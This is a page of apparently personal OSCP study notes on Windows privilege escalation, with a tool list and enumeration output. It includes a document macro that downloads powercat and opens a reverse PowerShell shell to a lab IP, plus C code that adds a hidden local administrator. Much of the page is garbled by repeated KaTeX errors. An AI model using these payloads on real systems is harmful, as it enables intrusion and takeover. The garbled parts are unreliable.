<!doctype html><html lang=en-us dir=ltr itemscope itemtype=http://schema.org/Article data-r-output-format=html><head><meta charset=utf-8><meta name=viewport content="height=device-height,width=device-width,initial-scale=1,minimum-scale=1"><meta name=generator content="Hugo 0.131.0"><meta name=generator content="Relearn 8.2.0"><meta name=description content="Windows Privilege Escalation Abusing Windows group privileges Abusing Windows user privileges Bypassing User Account Control Abusing weak service/file permissions Leveraging unpatched kernel exploits Credential theft Traffic Capture and more. MACROS
go to toolsâ€“>macrosâ€“>oraganise macrosâ€”>basicâ€”>click on untitledâ€”>newâ€”>shell commands
then save it as .odt
Sub Main Shell(&#34;cmd /c powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.234/powercat.ps1');powercat -c 192.168.45.169 -p 4444 -e powershell&#34;) End Sub SERvice binary hijacking
#include int main () { int i; i = system (â€œnet user dave2 password123!"><meta name=author content><meta name=twitter:card content="summary"><meta name=twitter:title content="Windows Privilege Escalation :: DrakonOps"><meta name=twitter:description content="Windows Privilege Escalation Abusing Windows group privileges Abusing Windows user privileges Bypassing User Account Control Abusing weak service/file permissions Leveraging unpatched kernel exploits Credential theft Traffic Capture and more. MACROS
go to toolsâ€“>macrosâ€“>oraganise macrosâ€”>basicâ€”>click on untitledâ€”>newâ€”>shell commands
then save it as .odt
Sub Main Shell(&#34;cmd /c powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.234/powercat.ps1');powercat -c 192.168.45.169 -p 4444 -e powershell&#34;) End Sub SERvice binary hijacking
#include int main () { int i; i = system (â€œnet user dave2 password123!"><meta property="og:url" content="https://web/oscp-notes/windows-privilege-escalation/index.html"><meta property="og:site_name" content="DrakonOps"><meta property="og:title" content="Windows Privilege Escalation :: DrakonOps"><meta property="og:description" content="Windows Privilege Escalation Abusing Windows group privileges Abusing Windows user privileges Bypassing User Account Control Abusing weak service/file permissions Leveraging unpatched kernel exploits Credential theft Traffic Capture and more. MACROS
go to toolsâ€“>macrosâ€“>oraganise macrosâ€”>basicâ€”>click on untitledâ€”>newâ€”>shell commands
then save it as .odt
Sub Main Shell(&#34;cmd /c powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.234/powercat.ps1');powercat -c 192.168.45.169 -p 4444 -e powershell&#34;) End Sub SERvice binary hijacking
#include int main () { int i; i = system (â€œnet user dave2 password123!"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="OSCP Notes"><meta itemprop=name content="Windows Privilege Escalation :: DrakonOps"><meta itemprop=description content="Windows Privilege Escalation Abusing Windows group privileges Abusing Windows user privileges Bypassing User Account Control Abusing weak service/file permissions Leveraging unpatched kernel exploits Credential theft Traffic Capture and more. MACROS
go to toolsâ€“>macrosâ€“>oraganise macrosâ€”>basicâ€”>click on untitledâ€”>newâ€”>shell commands
then save it as .odt
Sub Main Shell(&#34;cmd /c powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.234/powercat.ps1');powercat -c 192.168.45.169 -p 4444 -e powershell&#34;) End Sub SERvice binary hijacking
#include int main () { int i; i = system (â€œnet user dave2 password123!"><meta itemprop=wordCount content="12500"><title>Windows Privilege Escalation :: DrakonOps</title>
<link href=../../images/logo.png?1762046208 rel=icon type=image/png><link href=../../css/auto-complete/auto-complete.min.css?1762046208 rel=stylesheet><script src=../../js/auto-complete/auto-complete.min.js?1762046208 defer></script><script src=../../js/search-lunr.min.js?1762046208 defer></script><script src=../../js/search.min.js?1762046208 defer></script><script>window.relearn=window.relearn||{},window.relearn.index_js_url="../../searchindex.en.js?1762046208"</script><script src=../../js/lunr/lunr.min.js?1762046208 defer></script><script src=../../js/lunr/lunr.stemmer.support.min.js?1762046208 defer></script><script src=../../js/lunr/lunr.multi.min.js?1762046208 defer></script><script src=../../js/lunr/lunr.en.min.js?1762046208 defer></script><script>window.relearn=window.relearn||{},window.relearn.contentLangs=["en"]</script><link href=../../fonts/fontawesome/css/fontawesome-all.min.css?1762046208 rel=stylesheet media=print onload='this.media="all",this.onload=null'><noscript><link href=../../fonts/fontawesome/css/fontawesome-all.min.css?1762046208 rel=stylesheet></noscript><link href=../../css/perfect-scrollbar/perfect-scrollbar.min.css?1762046208 rel=stylesheet><link href=../../css/theme.min.css?1762046208 rel=stylesheet><link href=../../css/format-html.min.css?1762046208 rel=stylesheet id=R-format-style><script>window.relearn=window.relearn||{},window.relearn.min=`.min`,window.relearn.path="/oscp-notes/windows-privilege-escalation/index.html",window.relearn.relBasePath="../..",window.relearn.relBaseUri="../..",window.relearn.absBaseUri="https://web",window.relearn.disableAnchorCopy=!1,window.relearn.disableAnchorScrolling=!1,window.relearn.disableInlineCopyToClipboard=!1,window.relearn.enableBlockCodeWrap=!0,window.relearn.getItem=(e,t)=>e.getItem(t),window.relearn.setItem=(e,t,n)=>e.setItem(t,n),window.relearn.removeItem=(e,t)=>e.removeItem(t),window.T_Copy_to_clipboard=`Copy to clipboard`,window.T_Copied_to_clipboard=`Copied to clipboard!`,window.T_Copy_link_to_clipboard=`Copy link to clipboard`,window.T_Link_copied_to_clipboard=`Copied link to clipboard!`,window.T_Reset_view=`Reset view`,window.T_View_reset=`View reset!`,window.T_No_results_found=`No results found for "{0}"`,window.T_N_results_found=`{1} results found for "{0}"`,window.relearn.themevariants=["zen-dark"],window.relearn.customvariantname="my-custom-variant",window.relearn.changeVariant=function(e){var t=document.documentElement.dataset.rThemeVariant;window.relearn.setItem(window.localStorage,window.relearn.absBaseUri+"/variant",e),document.documentElement.dataset.rThemeVariant=e,t!=e&&(document.dispatchEvent(new CustomEvent("themeVariantLoaded",{detail:{variant:e,oldVariant:t}})),window.relearn.markVariant())},window.relearn.markVariant=function(){var e=window.relearn.getItem(window.localStorage,window.relearn.absBaseUri+"/variant");document.querySelectorAll(".R-variantswitcher select").forEach(t=>{t.value=e})},window.relearn.initVariant=function(){var e=window.relearn.getItem(window.localStorage,window.relearn.absBaseUri+"/variant")??"";e==window.relearn.customvariantname||(!e||!window.relearn.themevariants.includes(e))&&(e=window.relearn.themevariants[0],window.relearn.setItem(window.localStorage,window.relearn.absBaseUri+"/variant",e)),document.documentElement.dataset.rThemeVariant=e},window.relearn.initVariant(),window.relearn.markVariant()</script><link href=../../css/custom.css?1762046208 rel=stylesheet></head><body class="mobile-support html" data-url=../../oscp-notes/windows-privilege-escalation/index.html><div id=R-body class=default-animation><div id=R-body-overlay></div><nav id=R-topbar><div class=topbar-wrapper><div class=topbar-sidebar-divider></div><div class="topbar-area topbar-area-start" data-area=start><div class="topbar-button topbar-button-sidebar" data-content-empty=disable data-width-s=show data-width-m=hide data-width-l=hide><span class="btn cstyle link noborder notitle interactive"><button onclick=toggleNav() type=button title="Menu (CTRL+ALT+n)"><i class="fa-fw fas fa-bars"></i></button></span></div><div class="topbar-button topbar-button-toc" data-content-empty=hide data-width-s=show data-width-m=show data-width-l=show><span class="btn cstyle link noborder notitle interactive"><button onclick=toggleTopbarFlyout(this) type=button title="Table of Contents (CTRL+ALT+t)"><i class="fa-fw fas fa-list-alt"></i></button></span><div class=topbar-content><div class=topbar-content-wrapper><nav class=TableOfContents><ul><li><ul><li></li></ul></li></ul><ul><li><ul><li></li></ul></li></ul><ul><li><ul><li></li></ul></li><li><a href=#named-pipes-attack-example>Named Pipes Attack Example</a><ul><li></li></ul></li></ul><ul><li><a href=#user-rights-assignment>User Rights Assignment</a><ul><li></li></ul></li><li><a href=#seimpersonate-example---juicypotato>SeImpersonate Example - JuicyPotato</a><ul><li></li></ul></li><li><a href=#printspoofer-and-roguepotato>PrintSpoofer and RoguePotato</a><ul><li></li></ul></li></ul><ul><li><a href=#remote-code-execution-as-system>Remote Code Execution as SYSTEM</a></li><li><a href=#leveraging-the-privilege>Leveraging the Privilege</a><ul><li></li></ul></li><li><a href=#when-to-use>When to Use?</a><ul><li></li></ul></li></ul><ul><li><ul><li></li></ul></li><li><a href=#robocopy>Robocopy</a><ul><li></li></ul></li></ul><ul><li><ul><li></li></ul></li></ul><ul><li><ul><li></li></ul></li><li><a href=#cleaning-up>Cleaning Up</a><ul><li></li></ul></li></ul><ul><li><ul><li></li></ul></li></ul><ul><li><ul><li></li></ul></li><li><a href=#alternate-exploitation---no-gui>Alternate Exploitation - No GUI</a></li><li><a href=#automating-the-steps>Automating the Steps</a><ul><li></li></ul></li><li><a href=#clean-up>Clean-up</a><ul><li></li></ul></li></ul><ul><li><ul><li></li></ul></li></ul><ul><li><ul><li></li></ul></li><li><a href=#weak-service-permissions>Weak Service Permissions</a><ul><li></li></ul></li><li><a href=#unquoted-service-path>Unquoted Service Path</a><ul><li></li></ul></li></ul></nav></div></div></div></div><ol class="topbar-breadcrumbs breadcrumbs highlightable" itemscope itemtype=http://schema.org/BreadcrumbList><li itemscope itemtype=https://schema.org/ListItem itemprop=itemListElement><a itemprop=item href=../../index.html><span itemprop=name>DrakonOps</span></a><meta itemprop=position content="1">&nbsp;>&nbsp;</li><li itemscope itemtype=https://schema.org/ListItem itemprop=itemListElement><a itemprop=item href=../../oscp-notes/index.html><span itemprop=name>OSCP Notes</span></a><meta itemprop=position content="2">&nbsp;>&nbsp;</li><li itemscope itemtype=https://schema.org/ListItem itemprop=itemListElement><span itemprop=name>Windows Privilege Escalation</span><meta itemprop=position content="3"></li></ol><div class="topbar-area topbar-area-end" data-area=end><div class="topbar-button topbar-button-prev" data-content-empty=disable data-width-s=show data-width-m=show data-width-l=show><span class="btn cstyle link noborder notitle interactive"><a href=../../oscp-notes/linux-privilege-escalation/index.html title="linux privilege escalation (ðŸ¡)"><i class="fa-fw fas fa-chevron-left"></i></a></span></div><div class="topbar-button topbar-button-next" data-content-empty=disable data-width-s=show data-width-m=show data-width-l=show><span class="btn cstyle link noborder notitle interactive"><a href=../../oscp-notes/pivoting_tunneling/index.html title="Scanning the Pivot Target (ðŸ¡’)"><i class="fa-fw fas fa-chevron-right"></i></a></span></div><div class="topbar-button topbar-button-more" data-content-empty=hide data-width-s=show data-width-m=show data-width-l=show><span class="btn cstyle link noborder notitle interactive"><button onclick=toggleTopbarFlyout(this) type=button title=More><i class="fa-fw fas fa-ellipsis-v"></i></button></span><div class=topbar-content><div class=topbar-content-wrapper><div class="topbar-area topbar-area-more" data-area=more></div></div></div></div></div></div></nav><div id=R-main-overlay></div><main id=R-body-inner class="highlightable oscp-notes" tabindex=-1><div class=flex-block-wrapper><article class=default><header class=headline></header><h1 id=windows-privilege-escalation>Windows Privilege Escalation</h1><h1 id=windows-privilege-escalation>Windows Privilege Escalation</h1><p>Â </p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>Abusing Windows group privileges</td><td>Abusing Windows user privileges</td></tr><tr><td>Bypassing User Account Control</td><td>Abusing weak service/file permissions</td></tr><tr><td>Leveraging unpatched kernel exploits</td><td>Credential theft</td></tr><tr><td>Traffic Capture</td><td>and more.</td></tr></tbody></table><p>Â </p><p>Â </p><p>Â </p><p>MACROS</p><p>go to tools&ndash;>macros&ndash;>oraganise macros&mdash;>basic&mdash;>click on untitled&mdash;>new&mdash;>shell commands</p><p><a href=#R-image-dfdcc151f08ce26340c75b54cb90902a class=lightbox-link><img alt=68d9ab25595cff42b5ea1cef140e858a.png class="lazy lightbox figure-image" loading=lazy src=../../resources/68d9ab25595cff42b5ea1cef140e858a.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-dfdcc151f08ce26340c75b54cb90902a><img alt=68d9ab25595cff42b5ea1cef140e858a.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/68d9ab25595cff42b5ea1cef140e858a.png></a></p><p>Â </p><p>then save it as .odt</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code>Sub Main
Shell(&#34;cmd /c powershell IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://192.168.45.234/powercat.ps1&#39;);powercat -c 192.168.45.169 -p 4444 -e powershell&#34;)
End Sub</code></pre></div><p>Â </p><p>SERvice binary hijacking</p><p><a href=#R-image-eccbe57c7bcf38f3065edbf4a78bd4e7 class=lightbox-link><img alt=0e770fe0864921221560205b556bb94d.png class="lazy lightbox figure-image" loading=lazy src=../../resources/0e770fe0864921221560205b556bb94d.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-eccbe57c7bcf38f3065edbf4a78bd4e7><img alt=0e770fe0864921221560205b556bb94d.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/0e770fe0864921221560205b556bb94d.png></a></p><p>Â </p><p>#include int main () { int i; i = system (&ldquo;net user dave2 password123! /add&rdquo;); i = system (&ldquo;net localgroup administrators dave2 /add&rdquo;); ret</p><p>Â </p><p>Â </p><p><a href=#R-image-879ecfce591432484cfe3031058822b8 class=lightbox-link><img alt=0b17b7232ab8a91ad81eb2c4f61c24f3.png class="lazy lightbox figure-image" loading=lazy src=../../resources/0b17b7232ab8a91ad81eb2c4f61c24f3.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-879ecfce591432484cfe3031058822b8><img alt=0b17b7232ab8a91ad81eb2c4f61c24f3.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/0b17b7232ab8a91ad81eb2c4f61c24f3.png></a></p><p>Â </p><p>Â </p><p>kali@kali:~$ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe</p><p>Â </p><p>Â </p><p>DLL hijacking</p><p>Download the binary in ypur pc</p><p>Â run procmon</p><p>Â </p><p><a href=#R-image-fd262962bb242563d2f4d1229a4620d7 class=lightbox-link><img alt=e0576ed85416b42c2edebc73d206ffe3.png class="lazy lightbox figure-image" loading=lazy src=../../resources/e0576ed85416b42c2edebc73d206ffe3.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-fd262962bb242563d2f4d1229a4620d7><img alt=e0576ed85416b42c2edebc73d206ffe3.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/e0576ed85416b42c2edebc73d206ffe3.png></a></p><p>Â </p><p>Â </p><p><a href=#R-image-304c464e0a174a216bad0ce2ee58e5e9 class=lightbox-link><img alt=dd9e32070810300cc201140df501c150.png class="lazy lightbox figure-image" loading=lazy src=../../resources/dd9e32070810300cc201140df501c150.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-304c464e0a174a216bad0ce2ee58e5e9><img alt=dd9e32070810300cc201140df501c150.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/dd9e32070810300cc201140df501c150.png></a></p><p>Â </p><p>Â </p><p><a href=#R-image-90d586913eec21033c221a919fe487e9 class=lightbox-link><img alt=8c4898e6ca365d3fa05c27513412e45e.png class="lazy lightbox figure-image" loading=lazy src=../../resources/8c4898e6ca365d3fa05c27513412e45e.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-90d586913eec21033c221a919fe487e9><img alt=8c4898e6ca365d3fa05c27513412e45e.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/8c4898e6ca365d3fa05c27513412e45e.png></a></p><p>Â </p><p>Â </p><p>16.3.1 Scheduled Tasks</p><p>Â </p><p>schtasks /query /fo LIST /v | Where-Object {<br>Â Â Â Â $_ -match &ldquo;^Task To Run:&rdquo; -and Â Â Â Â $Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â _ -notmatch &ldquo;\\Windows&rdquo; -and<br>Â Â Â Â $_ -notmatch &ldquo;\\System32&rdquo; -and Â Â Â Â $Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â _ -notmatch &ldquo;\\Program Files&rdquo; -and<br>Â Â Â Â $_ -notmatch &ldquo;\\ProgramData&rdquo; -and Â Â Â Â $Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â _ -notmatch &ldquo;\\Users\\Default&rdquo; -and<br>Â Â Â Â $_ -notmatch &ldquo;\\Users\\Administrator&rdquo;<br>}</p><p>schtasks /query /fo LIST /v | Where-Object { $_ -match &ldquo;^Task To Run:&rdquo; -and $_ -notmatch &ldquo;\\Windows\\System32&rdquo; -and $_ -notmatch &ldquo;\\Windows&rdquo; -and $_ -notmatch &ldquo;\\Program Files&rdquo; -and $_ -notmatch &ldquo;\\ProgramData&rdquo; -and $_ -notmatch &ldquo;\\Users\\Default&rdquo; -and $_ -notmatch &ldquo;\\Users\\Administrator&rdquo; }</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code>schtasks /query /fo LIST /v | Where-Object { $_ -match &#34;^Task To Run:&#34; -and $_ -notmatch &#34;\\Windows\\System32&#34; -and $_ -notmatch &#34;\\Windows&#34; -and $_ -notmatch &#34;\\Program Files&#34; -and $_ -notmatch &#34;\\ProgramData&#34; -and $_ -notmatch &#34;\\Users\\Default&#34; -and $_ -notmatch &#34;\\Users\\Administrator&#34; }</code></pre></div><p>Â </p><p>PS C:\Users\shaik> schtasks /query /fo LIST /v | Where-Object {$_ -match &ldquo;^Task To Run:&rdquo;} | Where-Object {$</p><p>KaTeX parse error: Expected &lsquo;EOF&rsquo;, got &lsquo;}&rsquo; at position 25: â€¦"^Task To Run:"}Ì² | Where-Objectâ€¦</p><p>KaTeX parse error: Expected &lsquo;EOF&rsquo;, got &lsquo;}&rsquo; at position 25: â€¦"^Task To Run:"}Ì² | Where-Objectâ€¦</p><p>KaTeX parse error: Expected &lsquo;EOF&rsquo;, got &lsquo;}&rsquo; at position 25: â€¦"^Task To Run:"}Ì² | Where-Objectâ€¦</p><p>KaTeX parse error: Expected &lsquo;EOF&rsquo;, got &lsquo;}&rsquo; at position 25: â€¦"^Task To Run:"}Ì² | Where-Objectâ€¦</p><p>KaTeX parse error: Expected &lsquo;EOF&rsquo;, got &lsquo;}&rsquo; at position 25: â€¦"^Task To Run:"}Ì² | Where-Objectâ€¦</p><p>KaTeX parse error: Expected &lsquo;EOF&rsquo;, got &lsquo;}&rsquo; at position 25: â€¦"^Task To Run:"}Ì² | Where-Objectâ€¦</p><p>KaTeX parse error: Expected &lsquo;EOF&rsquo;, got &lsquo;}&rsquo; at position 25: â€¦"^Task To Run:"}Ì² | Where-Objectâ€¦</p><p>KaTeX parse error: Expected &lsquo;EOF&rsquo;, got &lsquo;}&rsquo; at position 25: â€¦"^Task To Run:"}Ì² | Where-Objectâ€¦</p><p>KaTeX parse error: Expected &lsquo;EOF&rsquo;, got &lsquo;}&rsquo; at position 25: â€¦"^Task To Run:"}Ì² | Where-Objectâ€¦</p><p>KaTeX parse error: Expected &lsquo;EOF&rsquo;, got &lsquo;}&rsquo; at position 25: â€¦"^Task To Run:"}Ì² | Where-Objectâ€¦</p><p>KaTeX parse error: Expected &lsquo;EOF&rsquo;, got &lsquo;}&rsquo; at position 25: â€¦"^Task To Run:"}Ì² | Where-Objectâ€¦</p><p>KaTeX parse error: Expected &lsquo;EOF&rsquo;, got &lsquo;}&rsquo; at position 25: â€¦"^Task To Run:"}Ì² | Where-Objectâ€¦</p><p>_ -notmatch &ldquo;\\Windows&rdquo;} | Where-Object {$_ -notmatch &ldquo;\\System32&rdquo;} | Where-Object {$</p><p>KaTeX parse error: Expected &lsquo;EOF&rsquo;, got &lsquo;}&rsquo; at position 27: â€¦ &ldquo;\\\\System32&rdquo;}Ì² | Where-Objectâ€¦</p><p>KaTeX parse error: Expected &lsquo;EOF&rsquo;, got &lsquo;}&rsquo; at position 27: â€¦ &ldquo;\\\\System32&rdquo;}Ì² | Where-Objectâ€¦</p><p>KaTeX parse error: Expected &lsquo;EOF&rsquo;, got &lsquo;}&rsquo; at position 27: â€¦ &ldquo;\\\\System32&rdquo;}Ì² | Where-Objectâ€¦</p><p>KaTeX parse error: Expected &lsquo;EOF&rsquo;, got &lsquo;}&rsquo; at position 27: â€¦ &ldquo;\\\\System32&rdquo;}Ì² | Where-Objectâ€¦</p><p>KaTeX parse error: Expected &lsquo;EOF&rsquo;, got &lsquo;}&rsquo; at position 27: â€¦ &ldquo;\\\\System32&rdquo;}Ì² | Where-Objectâ€¦</p><p>KaTeX parse error: Expected &lsquo;EOF&rsquo;, got &lsquo;}&rsquo; at position 27: â€¦ &ldquo;\\\\System32&rdquo;}Ì² | Where-Objectâ€¦</p><p>KaTeX parse error: Expected &lsquo;EOF&rsquo;, got &lsquo;}&rsquo; at position 27: â€¦ &ldquo;\\\\System32&rdquo;}Ì² | Where-Objectâ€¦</p><p>KaTeX parse error: Expected &lsquo;EOF&rsquo;, got &lsquo;}&rsquo; at position 27: â€¦ &ldquo;\\\\System32&rdquo;}Ì² | Where-Objectâ€¦</p><p>KaTeX parse error: Expected &lsquo;EOF&rsquo;, got &lsquo;}&rsquo; at position 27: â€¦ &ldquo;\\\\System32&rdquo;}Ì² | Where-Objectâ€¦</p><p>KaTeX parse error: Expected &lsquo;EOF&rsquo;, got &lsquo;}&rsquo; at position 27: â€¦ &ldquo;\\\\System32&rdquo;}Ì² | Where-Objectâ€¦</p><p>KaTeX parse error: Expected &lsquo;EOF&rsquo;, got &lsquo;}&rsquo; at position 27: â€¦ &ldquo;\\\\System32&rdquo;}Ì² | Where-Objectâ€¦</p><p>KaTeX parse error: Expected &lsquo;EOF&rsquo;, got &lsquo;}&rsquo; at position 27: â€¦ &ldquo;\\\\System32&rdquo;}Ì² | Where-Objectâ€¦</p><p>_ -notmatch &ldquo;\\Program Files&rdquo;} | Where-Object {$_ -notmatch &ldquo;\\ProgramData&rdquo;} | Where-Object {$</p><p>KaTeX parse error: Expected &lsquo;EOF&rsquo;, got &lsquo;}&rsquo; at position 30: â€¦\\\ProgramData"}Ì² | Where-Objectâ€¦</p><p>KaTeX parse error: Expected &lsquo;EOF&rsquo;, got &lsquo;}&rsquo; at position 30: â€¦\\\ProgramData"}Ì² | Where-Objectâ€¦</p><p>KaTeX parse error: Expected &lsquo;EOF&rsquo;, got &lsquo;}&rsquo; at position 30: â€¦\\\ProgramData"}Ì² | Where-Objectâ€¦</p><p>KaTeX parse error: Expected &lsquo;EOF&rsquo;, got &lsquo;}&rsquo; at position 30: â€¦\\\ProgramData"}Ì² | Where-Objectâ€¦</p><p>KaTeX parse error: Expected &lsquo;EOF&rsquo;, got &lsquo;}&rsquo; at position 30: â€¦\\\ProgramData"}Ì² | Where-Objectâ€¦</p><p>KaTeX parse error: Expected &lsquo;EOF&rsquo;, got &lsquo;}&rsquo; at position 30: â€¦\\\ProgramData"}Ì² | Where-Objectâ€¦</p><p>KaTeX parse error: Expected &lsquo;EOF&rsquo;, got &lsquo;}&rsquo; at position 30: â€¦\\\ProgramData"}Ì² | Where-Objectâ€¦</p><p>KaTeX parse error: Expected &lsquo;EOF&rsquo;, got &lsquo;}&rsquo; at position 30: â€¦\\\ProgramData"}Ì² | Where-Objectâ€¦</p><p>KaTeX parse error: Expected &lsquo;EOF&rsquo;, got &lsquo;}&rsquo; at position 30: â€¦\\\ProgramData"}Ì² | Where-Objectâ€¦</p><p>KaTeX parse error: Expected &lsquo;EOF&rsquo;, got &lsquo;}&rsquo; at position 30: â€¦\\\ProgramData"}Ì² | Where-Objectâ€¦</p><p>KaTeX parse error: Expected &lsquo;EOF&rsquo;, got &lsquo;}&rsquo; at position 30: â€¦\\\ProgramData"}Ì² | Where-Objectâ€¦</p><p>KaTeX parse error: Expected &lsquo;EOF&rsquo;, got &lsquo;}&rsquo; at position 30: â€¦\\\ProgramData"}Ì² | Where-Objectâ€¦</p><p>_ -notmatch &ldquo;\\Users\\Default&rdquo;} | Where-Object {$_ -notmatch &ldquo;\\Users\\Administrator&rdquo;}</p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><h1 id=useful-tools>Useful Tools</h1><hr><p>There are many tools available to us to assist with enumerating Windows systems for common and obscure privilege escalation vectors. Below is a list of useful binaries and scripts, many of which we will cover within the coming module sections.</p><table><thead><tr><th>Tool</th><th>Description</th></tr></thead><tbody><tr><td><a href=https://github.com/GhostPack/Seatbelt rel=external>Seatbelt</a></td><td>C# project for performing a wide variety of local privilege escalation checks</td></tr><tr><td><a href=https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS rel=external>winPEAS</a></td><td>WinPEAS is a script that searches for possible paths to escalate privileges on Windows hosts. All of the checks are explained <a href=https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html rel=external>here</a></td></tr><tr><td><a href=https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 rel=external>PowerUp</a></td><td>PowerShell script for finding common Windows privilege escalation vectors that rely on misconfigurations. It can also be used to exploit some of the issues found</td></tr><tr><td><a href=https://github.com/GhostPack/SharpUp rel=external>SharpUp</a></td><td>C# version of PowerUp</td></tr><tr><td><a href=https://github.com/411Hall/JAWS rel=external>JAWS</a></td><td>PowerShell script for enumerating privilege escalation vectors written in PowerShell 2.0</td></tr><tr><td><a href=https://github.com/Arvanaghi/SessionGopher rel=external>SessionGopher</a></td><td>SessionGopher is a PowerShell tool that finds and decrypts saved session information for remote access tools. It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information</td></tr><tr><td><a href=https://github.com/rasta-mouse/Watson rel=external>Watson</a></td><td>Watson is a .NET tool designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities.</td></tr><tr><td><a href=https://github.com/AlessandroZ/LaZagne rel=external>LaZagne</a></td><td>Tool used for retrieving passwords stored on a local machine from web browsers, chat tools, databases, Git, email, memory dumps, PHP, sysadmin tools, wireless network configurations, internal Windows password storage mechanisms, and more</td></tr><tr><td><a href=https://github.com/bitsadmin/wesng rel=external>Windows Exploit Suggester - Next Generation</a></td><td>WES-NG is a tool based on the output of Windows&rsquo; <code>systeminfo</code> utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities. Every Windows OS between Windows XP and Windows 10, including their Windows Server counterparts, is supported</td></tr><tr><td><a href=https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite rel=external>Sysinternals Suite</a></td><td>We will use several tools from Sysinternals in our enumeration including <a href=https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk rel=external>AccessChk</a>, <a href=https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist rel=external>PipeList</a>, and <a href=https://docs.microsoft.com/en-us/sysinternals/downloads/psservice rel=external>PsService</a></td></tr></tbody></table><p>Â </p><p>We can also find pre-compiled binaries of <code>Seatbelt</code> and <code>SharpUp</code> <a href=https://github.com/r3motecontrol/Ghostpack-CompiledBinaries rel=external>here</a>, and standalone binaries of <code>LaZagne</code> <a href=https://github.com/AlessandroZ/LaZagne/releases/ rel=external>here</a>. It is recommended that we always compile our tools from the source if using them in a client environment.</p><p>Â </p><p>Â </p><h1 id=situational-awareness>Situational Awareness</h1><p>Â </p><h4 id=interfaces-ip-addresses-dns-information>Interface(s), IP Address(es), DNS Information</h4><p>Situational Awareness</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : WINLPE-SRV01
   Primary Dns Suffix  . . . . . . . :
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : .local

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-B9-C5-4B
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::f055:fefd:b1b:9919%9(Preferred)
   IPv4 Address. . . . . . . . . . . : 192.168.20.56(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.20.1
   DHCPv6 IAID . . . . . . . . . . . : 151015510
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-27-ED-DB-68-00-50-56-B9-90-94
   DNS Servers . . . . . . . . . . . : 8.8.8.8
   NetBIOS over Tcpip. . . . . . . . : Enabled

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : .local
   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection
   Physical Address. . . . . . . . . : 00-50-56-B9-90-94
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : dead:beef::e4db:5ea3:2775:8d4d(Preferred)
   Link-local IPv6 Address . . . . . : fe80::e4db:5ea3:2775:8d4d%4(Preferred)
   IPv4 Address. . . . . . . . . . . : 10.129.43.8(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Lease Obtained. . . . . . . . . . : Thursday, March 25, 2021 9:24:45 AM
   Lease Expires . . . . . . . . . . : Monday, March 29, 2021 1:28:44 PM
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:4ddf%4
                                       10.129.0.1
   DHCP Server . . . . . . . . . . . : 10.129.0.1
   DHCPv6 IAID . . . . . . . . . . . : 50352214
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-27-ED-DB-68-00-50-56-B9-90-94
   DNS Servers . . . . . . . . . . . : 1.1.1.1
                                       8.8.8.8
   NetBIOS over Tcpip. . . . . . . . : Enabled

Tunnel adapter isatap..local:

